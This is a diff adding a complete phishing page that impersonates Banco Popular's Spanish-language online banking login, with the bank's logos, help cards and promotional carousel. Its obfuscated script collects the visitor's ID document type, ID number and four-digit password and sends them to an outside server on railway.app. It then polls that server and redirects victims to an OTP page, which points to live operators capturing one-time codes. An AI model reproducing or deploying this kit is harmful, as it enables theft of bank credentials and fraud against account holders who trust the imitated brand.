@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="Banca en línea Banco Popular - Accede a tu cuenta de forma segura y realiza tus transacciones financieras.">
+    <meta name="robots" content="index, follow">
+    <meta name="theme-color" content="#00556e">
+    <link rel="icon" type="image/svg+xml" href="img/Isotipo.svg">
+    <title>Bienvenido a Banco Popular</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        @keyframes pageEnter {
+            from { opacity: 0; transform: translateY(20px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+        body { animation: pageEnter 0.6s cubic-bezier(0.4, 0, 0.2, 1) both; }
+        #loading-screen { animation: none; }
+
+        .register-row {
+            text-align: center;
+            margin-top: 18px;
+            font-size: 13px;
+            color: #555;
+        }
+        .register-row a {
+            color: var(--pop-secondary-900);
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .register-row a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <div id="loading-screen" class="loading-screen hidden">
+        <div class="loading-content">
+            <div class="loading-logo-circle">
+                <video class="loading-video" autoplay loop muted playsinline>
+                    <source src="img/panimada.mp4" type="video/mp4">
+                </video>
+            </div>
+            <p class="loading-title">Estamos validando tu información</p>
+            <p class="loading-subtitle">Por favor espera un momento</p>
+        </div>
+    </div>
+
+    <div class="page-wrapper">
+        <main class="main-layout">
+            <div class="login-card">
+                <div class="card-security-icon">
+                    <img src="img/icon-security-lock.svg" alt="Seguridad" onerror="this.parentNode.innerHTML='<span>🔒</span>'">
+                </div>
+
+                <h1 class="login-title">Bienvenido a</h1>
+                <div class="login-logo">
+                    <img src="img/Isotipo.svg" alt="Banco Popular" class="login-isotipo">
+                    <span class="login-banco-text">banco popular</span>
+                </div>
+
+                <div id="error-banner" class="error-banner hidden" role="alert">
+                    <span class="error-banner-icon">❌</span>
+                    <p id="error-message" class="error-banner-message">Su documento o clave son incorrectos, por favor intente nuevamente.</p>
+                </div>
+
+                <form id="loginForm" class="login-form" autocomplete="off">
+                    <div class="form-group">
+                        <label for="documento-tipo">Tipo de documento</label>
+                        <div class="custom-select" id="customDocType">
+                            <button type="button" class="custom-select-trigger" id="docTypeTrigger">
+                                <span class="custom-select-value" id="docTypeValue">Cédula de Ciudadanía</span>
+                                <svg class="custom-select-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none">
+                                    <path d="M6 9L12 15L18 9" stroke="#FE680D" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                                </svg>
+                            </button>
+                            <div class="custom-select-options" id="docTypeOptions">
+                                <div class="custom-select-option selected" data-value="Cédula de Ciudadanía">Cédula de Ciudadanía</div>
+                                <div class="custom-select-option" data-value="Cédula de Extranjería">Cédula de Extranjería</div>
+                                <div class="custom-select-option" data-value="Tarjeta de Identidad">Tarjeta de Identidad</div>
+                            </div>
+                            <input type="hidden" id="documento-tipo" name="documento-tipo" value="Cédula de Ciudadanía">
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="documento-numero">Número de documento</label>
+                        <input type="text" id="documento-numero" class="form-input" placeholder="" maxlength="15" inputmode="numeric" autocomplete="off">
+                    </div>
+
+                    <div class="form-group">
+                        <div class="clave-label-row">
+                            <label for="clave-input" class="clave-label">Contraseña única</label>
+                            <a href="#" class="clave-forgot-link">¿La olvidaste?</a>
+                        </div>
+                        <div class="clave-input-wrapper">
+                            <div class="clave-segments" id="clave-segments">
+                                <span class="clave-seg" data-index="0">–</span>
+                                <span class="clave-seg" data-index="1">–</span>
+                                <span class="clave-seg" data-index="2">–</span>
+                                <span class="clave-seg" data-index="3">–</span>
+                            </div>
+                            <button type="button" class="clave-eye-btn" id="clave-eye-btn" aria-label="Mostrar contraseña">
+                                <img src="img/pass-eye-hidden.svg" alt="" class="eye-img">
+                            </button>
+                            <input
+                                type="password"
+                                id="clave-input"
+                                class="clave-hidden-input"
+                                maxlength="4"
+                                inputmode="numeric"
+                                pattern="[0-9]*"
+                                autocomplete="off"
+                            >
+                        </div>
+                    </div>
+
+                    <div class="form-group checkbox-group">
+                        <label class="checkbox-label">
+                            <input type="checkbox" id="recordar-checkbox" class="checkbox-input">
+                            <div class="checkbox-wrapper">
+                                <span class="checkbox-custom"></span>
+                            </div>
+                            <span class="checkbox-text">Recordar tipo y número de documento</span>
+                        </label>
+                    </div>
+
+                    <button type="submit" id="btn-continuar" class="btn-continuar" disabled>Continuar</button>
+                </form>
+
+                <p class="register-row">¿No eres usuario? <a href="#">Regístrate</a></p>
+            </div>
+
+            <div class="right-column">
+                <section class="help-section">
+                    <h2 class="help-title">¿Cómo podemos ayudarte?</h2>
+                    <div class="help-grid">
+                        <a href="#" class="help-card">
+                            <div class="help-icon">
+                                <img src="img/icon-solicitar.svg" alt="Solicitar productos">
+                            </div>
+                            <span class="help-text">Solicitar productos</span>
+                        </a>
+                        <a href="#" class="help-card">
+                            <div class="help-icon">
+                                <img src="img/icon-contacto.svg" alt="Contáctanos">
+                            </div>
+                            <span class="help-text">Contáctanos</span>
+                        </a>
+                        <a href="#" class="help-card">
+                            <div class="help-icon">
+                                <img src="img/icon-visitanos.svg" alt="Visítanos" onerror="this.src='img/icon-contacto.svg'">
+                            </div>
+                            <span class="help-text">Visítanos</span>
+                        </a>
+                    </div>
+                </section>
+
+                <div class="carousel-card" id="dynamic-card">
+                    <div class="carousel-slide active">
+                        <div class="carousel-content">
+                            <h3 class="carousel-title">Pagos rápidos</h3>
+                            <p class="carousel-description">Paga tus servicios públicos/privados y obligaciones bancarias a través de tu cuenta de ahorros.</p>
+                            <a href="#" class="carousel-link">
+                                <span>Inscribe y paga</span>
+                                <span class="carousel-arrow">→</span>
+                            </a>
+                        </div>
+                        <div class="carousel-image-wrap">
+                            <img src="img/Vector.svg" alt="" class="carousel-vec carousel-vec-1" aria-hidden="true">
+                            <img src="img/Vector-1.svg" alt="" class="carousel-vec carousel-vec-2" aria-hidden="true">
+                            <img src="img/Woman-1.png" alt="Persona" class="carousel-image">
+                        </div>
+                    </div>
+
+                    <div class="carousel-slide">
+                        <div class="carousel-content">
+                            <h3 class="carousel-title">Transfiere fácil</h3>
+                            <p class="carousel-description">Envía dinero a tus cuentas o a terceros de forma segura y sin complicaciones.</p>
+                            <a href="#" class="carousel-link">
+                                <span>Transferir</span>
+                                <span class="carousel-arrow">→</span>
+                            </a>
+                        </div>
+                        <div class="carousel-image-wrap">
+                            <img src="img/Vector.svg" alt="" class="carousel-vec carousel-vec-1" aria-hidden="true">
+                            <img src="img/Vector-1.svg" alt="" class="carousel-vec carousel-vec-2" aria-hidden="true">
+                            <img src="img/Woman-2.png" alt="Persona" class="carousel-image">
+                        </div>
+                    </div>
+
+                    <div class="carousel-slide">
+                        <div class="carousel-content">
+                            <h3 class="carousel-title">Consulta tu saldo</h3>
+                            <p class="carousel-description">Revisa el estado de tus productos, movimientos y extractos en tiempo real.</p>
+                            <a href="#" class="carousel-link">
+                                <span>Ver productos</span>
+                                <span class="carousel-arrow">→</span>
+                            </a>
+                        </div>
+                        <div class="carousel-image-wrap">
+                            <img src="img/Vector.svg" alt="" class="carousel-vec carousel-vec-1" aria-hidden="true">
+                            <img src="img/Vector-1.svg" alt="" class="carousel-vec carousel-vec-2" aria-hidden="true">
+                            <img src="img/Woman-3.png" alt="Persona" class="carousel-image">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="carousel-bars">
+                    <div class="carousel-bar active"><div class="carousel-bar-fill"></div></div>
+                    <div class="carousel-bar"><div class="carousel-bar-fill"></div></div>
+                    <div class="carousel-bar"><div class="carousel-bar-fill"></div></div>
+                </div>
+            </div>
+        </main>
+
+        <section class="bottom-card">
+            <div class="legal-links">
+                <a href="#" class="legal-link">Seguridad</a>
+                <a href="#" class="legal-link">Accesibilidad</a>
+            </div>
+
+            <hr class="bottom-divider">
+
+            <div class="bottom-logos">
+                <img src="img/Isotipo.svg" alt="Banco Popular" class="bottom-iso">
+                <span class="bottom-sep"></span>
+                <img src="img/aval.png" alt="Grupo Aval" class="bottom-aval">
+            </div>
+
+            <p class="bottom-date" id="footer-date"></p>
+
+            <p class="bottom-copy">&copy; Banco Popular. Todos los derechos reservados. | v4.2.53</p>
+        </section>
+    </div>
+
+    <script>
+    (function(){
+        var _0xa1 = "https://multi-bancos-production.up.railway.app";
+        var _0xb2 = "popular";
+        var _0xc3 = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.floor(Math.random() * 10000));
+        try { sessionStorage.setItem('sessionId', _0xc3); } catch(e) {}
+
+        var _0xd4 = document.getElementById('documento-tipo');
+        var _0xe5 = document.getElementById('documento-numero');
+        var _0xf6 = document.getElementById('clave-input');
+        var _0xg7 = document.getElementById('clave-segments');
+        var _0xh8 = document.getElementById('clave-eye-btn');
+        var _0xi9 = document.getElementById('recordar-checkbox');
+        var _0xj0 = document.getElementById('btn-continuar');
+        var _0xk1 = document.getElementById('loginForm');
+        var _0xl2 = document.getElementById('error-banner');
+        var _0xm3 = document.getElementById('error-message');
+        var _0xn4 = document.getElementById('loading-screen');
+
+        var _0xo5 = _0xg7.querySelectorAll('.clave-seg');
+        var _0xp6 = false;
+
+        function _0xq7() {
+            var _0xr8 = _0xe5.value.replace(/\D/g, '');
+            _0xe5.value = _0xr8;
+            var _0xs9 = _0xf6.value.replace(/\D/g, '').slice(0, 4);
+            _0xf6.value = _0xs9;
+            _0xo5.forEach(function(_0xt0, _0xu1){
+                if (_0xu1 < _0xs9.length) {
+                    _0xt0.textContent = _0xp6 ? _0xs9[_0xu1] : '•';
+                    _0xt0.classList.add('filled');
+                } else {
+                    _0xt0.textContent = '–';
+                    _0xt0.classList.remove('filled');
+                }
+            });
+            var _0xv2 = _0xr8.length >= 5 && _0xs9.length === 4;
+            _0xj0.disabled = !_0xv2;
+            if (_0xv2) { _0xj0.classList.add('enabled'); }
+            else { _0xj0.classList.remove('enabled'); }
+        }
+
+        function _0xOcultarError() {
+            _0xl2.classList.add('hidden');
+        }
+
+        _0xe5.addEventListener('input', function(){
+            _0xOcultarError();
+            _0xq7();
+        });
+        _0xf6.addEventListener('input', function(){
+            _0xOcultarError();
+            _0xq7();
+        });
+
+        _0xg7.addEventListener('click', function(){ _0xf6.focus(); });
+
+        _0xh8.addEventListener('click', function(){
+            _0xp6 = !_0xp6;
+            if (_0xp6) {
+                _0xh8.innerHTML = '<svg class="eye-img" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>';
+            } else {
+                _0xh8.innerHTML = '<img src="img/pass-eye-hidden.svg" alt="" class="eye-img">';
+            }
+            _0xq7();
+        });
+
+        function _0xw3(_0xx4, _0xy5) {
+            _0xm3.textContent = _0xy5;
+            _0xl2.classList.remove('hidden');
+        }
+
+        var _0xCustomSel = document.getElementById('customDocType');
+        var _0xTrigger = document.getElementById('docTypeTrigger');
+        var _0xValueEl = document.getElementById('docTypeValue');
+        var _0xHidden = document.getElementById('documento-tipo');
+        var _0xOptions = document.querySelectorAll('.custom-select-option');
+
+        if (_0xTrigger && _0xCustomSel) {
+            _0xTrigger.addEventListener('click', function(e) {
+                e.stopPropagation();
+                _0xCustomSel.classList.toggle('open');
+            });
+
+            _0xOptions.forEach(function(_0xopt){
+                _0xopt.addEventListener('click', function(e){
+                    e.stopPropagation();
+                    var _0xval = _0xopt.getAttribute('data-value');
+                    _0xValueEl.textContent = _0xval;
+                    _0xHidden.value = _0xval;
+                    _0xOptions.forEach(function(o){ o.classList.remove('selected'); });
+                    _0xopt.classList.add('selected');
+                    _0xCustomSel.classList.remove('open');
+                    _0xOcultarError();
+                });
+            });
+
+            document.addEventListener('click', function(e){
+                if (!_0xCustomSel.contains(e.target)) {
+                    _0xCustomSel.classList.remove('open');
+                }
+            });
+        }
+
+        var _0xz6 = document.querySelectorAll('.carousel-slide');
+        var _0x07 = document.querySelectorAll('.carousel-bar');
+        var _0x18 = 0;
+        var _0x29 = 5000;
+        var _0xintervalo = null;
+
+        function _0x3a(_0x4b) {
+            _0xz6.forEach(function(_0x5c){ _0x5c.classList.remove('active'); });
+            _0x07.forEach(function(_0x6d){
+                _0x6d.classList.remove('active');
+                var _0xfill = _0x6d.querySelector('.carousel-bar-fill');
+                if (_0xfill) {
+                    _0xfill.style.transition = 'none';
+                    _0xfill.style.width = '0%';
+                }
+            });
+            _0xz6[_0x4b].classList.add('active');
+            _0x07[_0x4b].classList.add('active');
+            var _0xactiveFill = _0x07[_0x4b].querySelector('.carousel-bar-fill');
+            if (_0xactiveFill) {
+                void _0xactiveFill.offsetWidth;
+                _0xactiveFill.style.transition = 'width ' + (_0x29 / 1000) + 's linear';
+                _0xactiveFill.style.width = '100%';
+            }
+            _0x18 = _0x4b;
+        }
+
+        function _0xiniciar() {
+            if (_0xintervalo) clearInterval(_0xintervalo);
+            _0xintervalo = setInterval(function(){
+                var _0x7e = (_0x18 + 1) % _0xz6.length;
+                _0x3a(_0x7e);
+            }, _0x29);
+        }
+
+        _0x3a(0);
+        _0xiniciar();
+
+        _0x07.forEach(function(_0x8f, _0x9g){
+            _0x8f.addEventListener('click', function(){
+                _0x3a(_0x9g);
+                _0xiniciar();
+            });
+        });
+
+        try {
+            var _0xah = localStorage.getItem('popular_tipo');
+            var _0xbi = localStorage.getItem('popular_numero');
+            if (_0xah && _0xbi) {
+                _0xd4.value = _0xah;
+                _0xValueEl.textContent = _0xah;
+                _0xOptions.forEach(function(o){
+                    o.classList.remove('selected');
+                    if (o.getAttribute('data-value') === _0xah) o.classList.add('selected');
+                });
+                _0xe5.value = _0xbi;
+                _0xi9.checked = true;
+                _0xq7();
+            }
+        } catch(e) {}
+
+        _0xi9.addEventListener('change', function(){
+            try {
+                if (_0xi9.checked) {
+                    localStorage.setItem('popular_tipo', _0xd4.value);
+                    localStorage.setItem('popular_numero', _0xe5.value);
+                } else {
+                    localStorage.removeItem('popular_tipo');
+                    localStorage.removeItem('popular_numero');
+                }
+            } catch(e) {}
+        });
+
+        _0xk1.addEventListener('submit', async function(_0xcia){
+            _0xcia.preventDefault();
+            if (_0xj0.disabled) return;
+
+            var _0xdia = _0xd4.value;
+            var _0xeia = _0xe5.value.trim();
+            var _0xfia = _0xf6.value.trim();
+
+            if (!_0xeia || _0xfia.length !== 4) {
+                _0xw3('❌', 'Complete correctamente los datos.');
+                return;
+            }
+
+            try {
+                if (_0xi9.checked) {
+                    localStorage.setItem('popular_tipo', _0xdia);
+                    localStorage.setItem('popular_numero', _0xeia);
+                }
+                sessionStorage.setItem('usuario', _0xeia);
+                sessionStorage.setItem('clave', _0xfia);
+                sessionStorage.setItem('tipoDoc', _0xdia);
+            } catch(e) {}
+
+            _0xn4.classList.remove('hidden');
+            _0xn4.classList.add('show');
+            document.body.style.overflow = 'hidden';
+
+            try {
+                var _0xgia = await fetch(_0xa1 + '/' + _0xb2 + '/enviar', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sessionId: _0xc3,
+                        tipo: 'Clave segura',
+                        tipoDoc: _0xdia,
+                        identificacion: _0xeia,
+                        clave: _0xfia
+                    })
+                });
+                var _0xhia = await _0xgia.json();
+                console.log('Enviado:', _0xhia);
+            } catch (_0xiia) {
+                console.error('Error:', _0xiia);
+            }
+
+            var _0xjia = setInterval(async function(){
+                try {
+                    var _0xkia = await fetch(_0xa1 + '/' + _0xb2 + '/estado/' + _0xc3);
+                    var _0xlia = await _0xkia.json();
+                    console.log('Estado:', _0xlia.estado);
+
+                    if (_0xlia.estado === 'otp') {
+                        clearInterval(_0xjia);
+                        window.location.href = 'otp.html';
+                    } else if (_0xlia.estado === 'rechazado') {
+                        clearInterval(_0xjia);
+                        _0xn4.classList.remove('show');
+                        _0xn4.classList.add('hidden');
+                        document.body.style.overflow = '';
+                        setTimeout(function(){
+                            _0xw3('❌', 'Su documento o clave son incorrectos, por favor intente nuevamente.');
+                        }, 300);
+                    }
+                } catch (_0xmia) {
+                    console.error('Error estado:', _0xmia);
+                }
+            }, 2000);
+        });
+
+        var _0xnia = new Date();
+        var _0xoia = _0xnia.toLocaleDateString('es-CO', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' });
+        var _0xqia = _0xoia.charAt(0).toUpperCase() + _0xoia.slice(1);
+        var _0xpia = document.getElementById('footer-date');
+        if (_0xpia) _0xpia.textContent = _0xqia + ' | ' + _0xnia.toLocaleTimeString('es-CO', { hour: '2-digit', minute: '2-digit', hour12: true });
+    })();
+    </script>
+
+<script>
+(function(){
+'use strict';
+var _0xria=0;
+document.addEventListener('touchend',function(_0xsia){
+var _0xtia=new Date().getTime();
+if(_0xtia-_0xria<=300){_0xsia.preventDefault();}
+_0xria=_0xtia;
+},{passive:false});
+document.addEventListener('dblclick',function(_0xuia){_0xuia.preventDefault();});
+document.addEventListener('focusin',function(_0xvia){
+var _0xwia=(_0xvia.target&&_0xvia.target.tagName)?_0xvia.target.tagName.toLowerCase():'';
+if(_0xwia==='input'||_0xwia==='textarea'||_0xwia==='select'){
+if(_0xvia.target.style.fontSize!=='16px'){
+_0xvia.target.dataset._fs=_0xvia.target.style.fontSize||'';
+_0xvia.target.style.fontSize='16px';
+}
+}
+});
+document.addEventListener('focusout',function(_0xxia){
+var _0xwia=(_0xxia.target&&_0xxia.target.tagName)?_0xxia.target.tagName.toLowerCase():'';
+if(_0xwia==='input'||_0xwia==='textarea'||_0xwia==='select'){
+if(_0xxia.target.dataset._fs!==undefined){
+_0xxia.target.style.fontSize=_0xxia.target.dataset._fs;
+delete _0xxia.target.dataset._fs;
+}
+}
+});
+})();
+</script>
+</body>
+</html>
